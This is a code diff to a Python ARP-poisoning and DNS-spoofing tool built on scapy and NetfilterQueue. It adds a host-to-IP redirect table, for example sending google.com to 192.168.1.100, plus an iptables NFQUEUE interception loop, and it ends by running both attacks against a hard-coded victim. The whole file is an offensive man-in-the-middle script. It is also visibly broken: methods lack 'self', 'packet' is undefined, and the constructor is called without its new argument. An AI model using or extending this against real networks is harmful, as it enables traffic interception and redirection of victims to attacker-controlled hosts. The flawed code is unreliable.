@@ -1,13 +1,24 @@
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
 import os
+import logging as log
 
 
 class DefaultTool:
-    def __init__(self, victim_ip, server_ip):
+    def __init__(self, victim_ip, server_ip, dns_hosts):
         self.victim_ip = victim_ip
         self.server_ip = server_ip
         self.network_interface = "enp0s3"
+        
+        # initialise dns_hosts dictionary for dns spoof
+        self.dns_hosts = dns_hosts
+        #example{
+         #   b"www.google.com.": "192.168.1.100",
+         #   b"google.com.": "192.168.1.100",
+         #  b"facebook.com.": "172.217.19.142"
+        #}
+        self.queueNum = 4
+        self.queue = NetfilterQueue()
 
     @staticmethod
     def get_mac_from_ip(ip):
@@ -46,16 +57,31 @@ class DefaultTool:
         
         
     # DNS spoofing  
+    #Step1: Create a queue to intercept all packets from DNS
+    def nfqueue():
+        #IP table rule to sniff DNS packets
+        self.queue.bind(self.queueNum, self.intercept_packets)
+        
+        try:
+            self.queue.run()
+        except KeyboardInterrupt: #to escape when crtl+c clicked
+            os.system(
+                f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
+            log.info("[!] iptable rule flushed")
     
-    #Step1: convert netfilter packet to scapy packet  
+    #Step2: convert netfilter packet to scapy packet  
     def intercept_packets():
         
+        #IP table rule to sniff DNS packets
+        #os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num  4")
+                
+        #get netfilter packets and convert to python
         scapy_packet = IP(packet.get_payload())
         if scapy_packet.haslayer(DNSRR):
             
             # if the packet is a DNS Resource Record (DNS reply)
             # modify the packet
-            print("[Before]:", scapy_packet.summary())
+            print("(Before):", scapy_packet.summary())
             
             try:
                 scapy_packet = modify_packet(scapy_packet)
@@ -63,13 +89,13 @@ class DefaultTool:
                 # not UDP packet, this can be IPerror/UDPerror packets
                 pass
             
-            print("[After ]:", scapy_packet.summary())
+            print("(After):", scapy_packet.summary())
             # set back as netfilter queue packet
             packet.set_payload(bytes(scapy_packet))
         # accept the packet
         packet.accept()
      
-    # Step 2: Carry out DNS spoof   
+    # Step 3: Carry out DNS spoof   
     def modify_packet(packet):
         """
         Modifies the DNS Resource Record `packet` ( the answer part)
@@ -79,7 +105,7 @@ class DefaultTool:
         """
         # get the DNS question name, the domain name
         qname = packet[DNSQR].qname
-        if qname not in dns_hosts:
+        if qname not in self.dns_hosts:
             # if the website isn't in our record
             # we don't wanna modify that
             print("no modification:", qname)
@@ -87,7 +113,7 @@ class DefaultTool:
         # craft new answer, overriding the original
         # setting the rdata for the IP we want to redirect (spoofed)
         # for instance, google.com will be mapped to "192.168.1.100"
-        packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
+        packet[DNS].an = DNSRR(rrname=qname, rdata=self.dns_hosts[qname])
         # set the answer count to 1
         packet[DNS].ancount = 1
         # delete checksums and length of packet, because we have modified the packet
@@ -105,3 +131,4 @@ server_ip = "192.168.56.102"
 
 tool = DefaultTool(victim_ip, server_ip)
 tool.arp_poisoning()
+tool.nfqueue()
